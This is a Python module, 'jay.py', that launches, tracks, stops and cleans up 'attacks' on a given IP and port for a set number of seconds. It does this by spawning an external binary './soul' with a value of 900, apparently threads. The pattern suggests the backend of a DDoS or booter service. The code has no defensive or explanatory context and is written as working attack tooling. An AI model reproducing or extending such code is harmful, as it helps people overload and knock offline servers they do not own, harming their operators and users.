# jay.py
import subprocess
import time
import threading

active_tasks = {}
task_lock = threading.Lock()

def launch_attack(ip, port, time_val):
    """Launch an attack and return True if successful"""
    try:
        key = (ip, str(port), str(time_val))
        
        with task_lock:
            if key in active_tasks:
                return False  # Attack already running
            
            print(f"[+] New task: {ip}:{port} for {time_val}s")
            try:
                process = subprocess.Popen(['./soul', ip, str(port), str(time_val), '900'])
                print(f"[+] Binary started: ./soul {ip} {port} {time_val} 900 (PID: {process.pid})")
                
                # Store process info
                active_tasks[key] = {
                    'process': process,
                    'start_time': time.time(),
                    'duration': int(time_val)
                }
                return True
            except Exception as e:
                print(f"[!] Failed to launch: {e}")
                return False
    except Exception as e:
        print(f"[!] Error in launch_attack: {e}")
        return False

def stop_attack(ip, port):
    """Stop a running attack and return True if successful"""
    try:
        # Find the task with matching IP and port
        with task_lock:
            for key in list(active_tasks.keys()):
                if key[0] == ip and key[1] == str(port):
                    process_info = active_tasks[key]
                    try:
                        process_info['process'].terminate()
                        process_info['process'].wait(timeout=5)
                    except:
                        try:
                            process_info['process'].kill()
                        except:
                            pass
                    
                    del active_tasks[key]
                    print(f"[+] Stopped attack on {ip}:{port}")
                    return True
            
            return False  # No matching task found
    except Exception as e:
        print(f"[!] Error in stop_attack: {e}")
        return False

def cleanup_finished_tasks():
    """Clean up finished tasks (runs in background thread)"""
    while True:
        try:
            with task_lock:
                tasks_to_delete = []
                for key, info in active_tasks.items():
                    # Check if process has finished
                    if info['process'].poll() is not None:
                        ip, port, time_val = key
                        print(f"[+] Task finished: {ip}:{port}")
                        tasks_to_delete.append(key)
                    
                    # Check if task has exceeded its duration
                    elapsed = time.time() - info['start_time']
                    if elapsed > info['duration'] + 10:  # Allow 10 seconds grace period
                        ip, port, time_val = key
                        print(f"[+] Force cleaning stale task: {ip}:{port}")
                        try:
                            info['process'].terminate()
                        except:
                            pass
                        tasks_to_delete.append(key)
                
                for key in tasks_to_delete:
                    del active_tasks[key]
        except Exception as e:
            print(f"[!] Error in cleanup: {e}")
        
        time.sleep(5)

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_finished_tasks, daemon=True)
cleanup_thread.start()
